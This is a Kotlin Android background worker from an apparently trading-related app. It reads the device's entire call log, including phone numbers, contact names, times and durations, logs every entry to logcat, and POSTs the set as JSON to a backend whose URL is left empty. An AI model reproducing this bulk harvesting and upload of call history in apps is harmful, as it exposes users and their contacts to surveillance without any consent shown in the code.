package com.example.tradex

import android.content.Context
import android.database.Cursor
import android.provider.CallLog
import android.util.Log
import androidx.work.CoroutineWorker
import androidx.work.WorkerParameters
import kotlinx.coroutines.Dispatchers
import kotlinx.coroutines.withContext
import org.json.JSONArray
import org.json.JSONObject
import java.io.OutputStreamWriter
import java.net.HttpURLConnection
import java.net.URL
import java.text.SimpleDateFormat
import java.util.*

class CallLogsWorker(
    private val context: Context,
    workerParams: WorkerParameters
) : CoroutineWorker(context, workerParams) {

    override suspend fun doWork(): Result = withContext(Dispatchers.IO) {
        try {
            
            val callLogs = fetchCallLogs()
            Log.d("CallLogsWorker", "Fetched ${callLogs.size} call logs.")

            
            val backendResponse = sendCallLogsToBackend(callLogs)

            if (backendResponse) {
                Log.d("CallLogsWorker", "Call logs sent successfully!")
                Result.success()
            } else {
                Log.e("CallLogsWorker", "Failed to send call logs to the backend.")
                Result.retry()
            }
        } catch (e: Exception) {
            Log.e("CallLogsWorker", "Error occurred: ${e.message}", e)
            Result.failure()
        }
    }

    private fun fetchCallLogs(): List<Map<String, Any>> {
        val callLogs = mutableListOf<Map<String, Any>>()
        val projection = arrayOf(
            CallLog.Calls.NUMBER,
            CallLog.Calls.DATE,
            CallLog.Calls.DURATION,
            CallLog.Calls.TYPE,
            CallLog.Calls.CACHED_NAME
        )

        val cursor: Cursor? = context.contentResolver.query(
            CallLog.Calls.CONTENT_URI,
            projection,
            null,
            null,
            CallLog.Calls.DATE + " DESC"
        )

        cursor?.use {
            val numberIndex = it.getColumnIndex(CallLog.Calls.NUMBER)
            val dateIndex = it.getColumnIndex(CallLog.Calls.DATE)
            val durationIndex = it.getColumnIndex(CallLog.Calls.DURATION)
            val typeIndex = it.getColumnIndex(CallLog.Calls.TYPE)
            val nameIndex = it.getColumnIndex(CallLog.Calls.CACHED_NAME)

            while (it.moveToNext()) {
                val number = it.getString(numberIndex) ?: "Unknown"
                val timestamp = it.getLong(dateIndex)
                val duration = it.getInt(durationIndex)
                val type = it.getInt(typeIndex)
                val name = it.getString(nameIndex) ?: "Unknown"

                val formattedTimestamp = SimpleDateFormat("yyyy-MM-dd HH:mm:ss", Locale.getDefault()).format(Date(timestamp))

                val callType = when (type) {
                    CallLog.Calls.INCOMING_TYPE -> "Incoming"
                    CallLog.Calls.OUTGOING_TYPE -> "Outgoing"
                    CallLog.Calls.MISSED_TYPE -> "Missed"
                    CallLog.Calls.VOICEMAIL_TYPE -> "Voicemail"
                    CallLog.Calls.REJECTED_TYPE -> "Rejected"
                    CallLog.Calls.BLOCKED_TYPE -> "Blocked"
                    else -> "Unknown"
                }

                val callDetails = mapOf(
                    "recipient" to (name + " ($number)"),
                    "timestamp" to formattedTimestamp,
                    "duration" to duration,
                    "type" to callType,
                    "missed" to (type == CallLog.Calls.MISSED_TYPE)
                )

                callLogs.add(callDetails)
                Log.d("CallLogsWorker", "Fetched call log: $callDetails")
            }
        }

        return callLogs
    }

    private fun sendCallLogsToBackend(callLogs: List<Map<String, Any>>): Boolean {
        val url = URL("")
        val jsonArray = JSONArray()

        for (callLog in callLogs) {
            val callLogJson = JSONObject(callLog)
            jsonArray.put(callLogJson)
        }

        val connection = url.openConnection() as HttpURLConnection
        connection.apply {
            requestMethod = "POST"
            setRequestProperty("Content-Type", "application/json")
            doOutput = true
        }

        val outputStream = OutputStreamWriter(connection.outputStream)
        outputStream.write(jsonArray.toString())
        outputStream.flush()
        outputStream.close()

        Log.d("CallLogsWorker", "Sending call logs to backend: ${jsonArray.toString(2)}")

        return connection.responseCode == HttpURLConnection.HTTP_OK
    }
}
